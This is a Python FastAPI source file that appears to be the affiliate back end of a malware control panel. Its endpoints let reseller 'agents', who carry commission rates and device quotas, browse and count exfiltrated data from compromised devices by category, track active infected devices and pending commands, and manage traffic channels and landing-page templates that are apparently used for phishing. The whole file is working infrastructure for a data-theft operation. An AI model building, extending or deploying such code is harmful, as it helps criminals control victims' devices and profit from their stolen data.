from fastapi import APIRouter, Depends, Query
from sqlalchemy.orm import Session
from sqlalchemy import desc, func
from datetime import datetime, timedelta
from typing import Optional

from ...database import get_db, ExfilData, Device, Command, TrafficChannel, LandingTemplate, DeviceGroup
from ...agent_auth import get_current_agent, Agent

router = APIRouter(prefix="/api/agent", tags=["agent-misc"], redirect_slashes=False)


@router.get("/exfil")
async def agent_exfil(
    skip: int = 0, limit: int = 100, category: Optional[str] = None,
    device_uuid: Optional[str] = None,
    db: Session = Depends(get_db), current_agent: Agent = Depends(get_current_agent)
):
    q = db.query(ExfilData).join(Device, ExfilData.device_uuid == Device.device_uuid).filter(Device.agent_id == current_agent.id)
    if category: q = q.filter(ExfilData.category == category)
    if device_uuid: q = q.filter(ExfilData.device_uuid == device_uuid)
    total = q.count()
    rows = q.order_by(desc(ExfilData.uploaded_at)).offset(skip).limit(limit).all()
    items = []
    for e in rows:
        d = {c.name: getattr(e, c.name) for c in e.__table__.columns}
        if isinstance(d.get("uploaded_at"), datetime):
            d["uploaded_at"] = d["uploaded_at"].isoformat()
        items.append(d)
    return {"total": total, "items": items}


@router.get("/exfil/stats")
async def agent_exfil_stats(db: Session = Depends(get_db), current_agent: Agent = Depends(get_current_agent)):
    q = db.query(ExfilData).join(Device, ExfilData.device_uuid == Device.device_uuid).filter(Device.agent_id == current_agent.id)
    total = q.count() or 0
    by_cat = dict(db.query(ExfilData.category, func.count(ExfilData.id)).join(Device, ExfilData.device_uuid == Device.device_uuid).filter(Device.agent_id == current_agent.id).group_by(ExfilData.category).all())
    return {"total": int(total), "by_category": by_cat}


@router.get("/channels")
async def agent_channels(db: Session = Depends(get_db), current_agent: Agent = Depends(get_current_agent)):
    rows = db.query(TrafficChannel).filter(TrafficChannel.agent_id == current_agent.id).order_by(desc(TrafficChannel.id)).all()
    items = []
    for c in rows:
        d = {col.name: getattr(c, col.name) for col in c.__table__.columns}
        for k in ("created_at", "updated_at"):
            if isinstance(d.get(k), datetime):
                d[k] = d[k].isoformat()
        d["device_count"] = int(db.query(func.count(Device.id)).filter(Device.channel_id == c.id).scalar() or 0)
        items.append(d)
    return {"items": items}


@router.get("/templates")
async def agent_templates(db: Session = Depends(get_db), current_agent: Agent = Depends(get_current_agent)):
    rows = db.query(LandingTemplate).filter((LandingTemplate.agent_id == current_agent.id) | (LandingTemplate.agent_id.is_(None))).order_by(desc(LandingTemplate.id)).all()
    items = []
    for t in rows:
        d = {col.name: getattr(t, col.name) for col in t.__table__.columns}
        for k in ("created_at", "updated_at"):
            if isinstance(d.get(k), datetime):
                d[k] = d[k].isoformat()
        items.append(d)
    return {"items": items}


@router.get("/groups")
async def agent_groups(db: Session = Depends(get_db), current_agent: Agent = Depends(get_current_agent)):
    rows = db.query(DeviceGroup).filter((DeviceGroup.agent_id == current_agent.id) | (DeviceGroup.agent_id.is_(None))).all()
    items = []
    for g in rows:
        d = {col.name: getattr(g, col.name) for col in g.__table__.columns}
        for k in ("created_at", "updated_at"):
            if isinstance(d.get(k), datetime):
                d[k] = d[k].isoformat()
        d["device_count"] = int(db.query(func.count(Device.id)).filter(Device.group_id == g.id).scalar() or 0)
        items.append(d)
    return {"items": items}


@router.get("/dashboard/stats")
async def agent_dashboard(db: Session = Depends(get_db), current_agent: Agent = Depends(get_current_agent)):
    today = datetime.now().date()
    today_start = datetime.combine(today, datetime.min.time())
    total_devices = db.query(func.count(Device.id)).filter(Device.agent_id == current_agent.id).scalar() or 0
    active_cutoff = datetime.now() - timedelta(minutes=30)
    active_devices = db.query(func.count(Device.id)).filter(Device.agent_id == current_agent.id, Device.last_seen >= active_cutoff).scalar() or 0
    total_exfil = db.query(func.count(ExfilData.id)).join(Device, ExfilData.device_uuid == Device.device_uuid).filter(Device.agent_id == current_agent.id).scalar() or 0
    pending = db.query(func.count(Command.id)).join(Device, Command.device_uuid == Device.device_uuid).filter(Device.agent_id == current_agent.id, Command.status == "pending").scalar() or 0
    today_exfil = db.query(func.count(ExfilData.id)).join(Device, ExfilData.device_uuid == Device.device_uuid).filter(Device.agent_id == current_agent.id, ExfilData.uploaded_at >= today_start).scalar() or 0
    return {
        "total_devices": int(total_devices), "active_devices": int(active_devices),
        "total_exfil": int(total_exfil), "pending_commands": int(pending),
        "today_exfil": int(today_exfil),
    }


@router.get("/notifications")
async def agent_notifications(skip: int = 0, limit: int = 20, db: Session = Depends(get_db), current_agent: Agent = Depends(get_current_agent)):
    from ...database import Notification
    q = db.query(Notification).order_by(desc(Notification.timestamp))
    total = q.count()
    rows = q.offset(skip).limit(limit).all()
    items = []
    for n in rows:
        d = {col.name: getattr(n, col.name) for col in n.__table__.columns}
        if isinstance(d.get("timestamp"), datetime):
            d["timestamp"] = d["timestamp"].isoformat()
        items.append(d)
    return {"total": total, "items": items}


@router.get("/profile")
async def agent_profile(current_agent: Agent = Depends(get_current_agent)):
    return {
        "id": current_agent.id, "username": current_agent.username,
        "name": current_agent.name, "contact": current_agent.contact,
        "phone": current_agent.phone, "enabled": int(current_agent.enabled if current_agent.enabled is not None else 1),
        "max_devices": current_agent.max_devices or 0,
        "commission_rate": current_agent.commission_rate or 0,
        "notes": current_agent.notes,
        "last_login": current_agent.last_login.isoformat() if current_agent.last_login else None,
        "last_login_ip": current_agent.last_login_ip,
        "google_2fa_enabled": int(current_agent.google_2fa_enabled or 0),
        "created_at": current_agent.created_at.isoformat() if current_agent.created_at else None,
        "updated_at": current_agent.updated_at.isoformat() if current_agent.updated_at else None,
    }
